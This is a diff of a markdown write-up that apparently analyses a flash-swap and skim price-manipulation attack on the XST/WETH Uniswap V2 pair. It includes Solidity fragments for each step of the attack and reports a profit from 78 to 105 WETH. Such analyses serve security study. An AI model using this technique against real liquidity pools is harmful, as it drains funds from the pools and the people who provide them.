@@ -8,29 +8,14 @@
 
 
 ## Vulnerability
-
-
+Skimming logic
 
 ## Analysis
 
 
-
-### Exploited code
-
-```solidity
-   code here
-```
-
 # proof of concept (PoC) 
 
-
-
-#### get values
-
-
-
-
-![XTS Image](../images/XTS/label.drawio.png)
+We check the balance of WETH within the XST pool on Uniswap and initiate a swap for twice that amount. This action triggers a callback, invoking our custom `uniswapV2Call` function.
 
 ```solidity
         amount = WETH.balanceOf(address(Pair2));
@@ -38,9 +23,15 @@
 ```
 
 
+In our `uniswapV2Call` we proceed by getting the current reserves of the XST/WETH pair on Uniswap
+
+![XTS Image](../images/XTS/label.drawio.png)
+
+
+
 ```solidity
 uint256 amountSellWETH = WETH.balanceOf(address(this));
-(uint256 reserve0, uint256 reserve1,) = Pair2.getReserves(); // r0 : XST r1 WETH
+(uint256 reserve0, uint256 reserve1,) = Pair2.getReserves(); 
 ```
 
 ![XTS Image](../images/XTS/before.drawio.png)
@@ -48,7 +39,10 @@ uint256 amountSellWETH = WETH.balanceOf(address(this));
 
 
 
-## calculate swap
+### Calculate swap
+
+To execute a swap on Uniswap, we adhere to the Uniswap formula, inserting the required parameters for swaps.
+With the following parameters:
 
 ![XTS Image](../images/XTS/para1.drawio.png)
 
@@ -68,7 +62,7 @@ swap ST tokens for WETH tokens in the liquidity pool of Uniswap XST
 ```
 
 
-#### skim
+### Skimming
 
 The skim function in Uniswap V2 is used to claim accumulated tokens from a liquidity pool without removing liquidity. 
 It's often used to retrieve additional tokens accumulated due to various operations, such as swaps.
@@ -84,50 +78,46 @@ It's often used to retrieve additional tokens accumulated due to various operati
 ```
 
 
-After skimming the tokens we transfer the XST tokens to the liquitiy pool, wich allows us to manipulate the price
+After skimming the tokens we sell the XST tokens to the WETH liquitiy pool, which allows us to manipulate the price
 
 
 ```solidity
-   // sell XST to WETH
-          // XST is SupportFeeOn Token
-          XST.transfer(address(Pair2), XST.balanceOf(address(this)));
+   XST.transfer(address(Pair2), XST.balanceOf(address(this)));
 ```
 
 ![XTS Image](../images/XTS/liq.drawio.png)
 
+Now we repeat the first steps:
 
-
-
-## Calculate swap
+### Calculate swap
 
 ![XTS Image](../images/XTS/para2.drawio.png)
 
 ```solidity
-   uint256 amountOutWETH = amountSellXST * 997 * reserve4 / (reserve3 * 1000 + amountSellXST * 997);
+   uint256 amountOutWETH = amountSellXST * 997 * reserve1 / (reserve0 * 1000 + amountSellXST * 997);
 ```
 
 
-## Swap for profit
+### Swap for profit
 
 ```solidity
    Pair2.swap(0, amountOutWETH, address(this), "");
 ```
 
 
-## Repay flashloan
+### Repay flashloan
 
 ```solidity
    WETH.transfer(address(Pair1), (amount * 2) * 1000 / 997 + 1000);
 ```
 
 
-
-
-
 ![XTS Image](../images/XTS/after.drawio.png)
 
 
-## profit
+### profit
+
+Since we initiated the flash swap with 78 WETH, and at the and of the flash swap had 105 WETH, we were able to send the profit back to our wallet
 
 
 ![XTS Image](../images/XTS/profit.drawio.png)
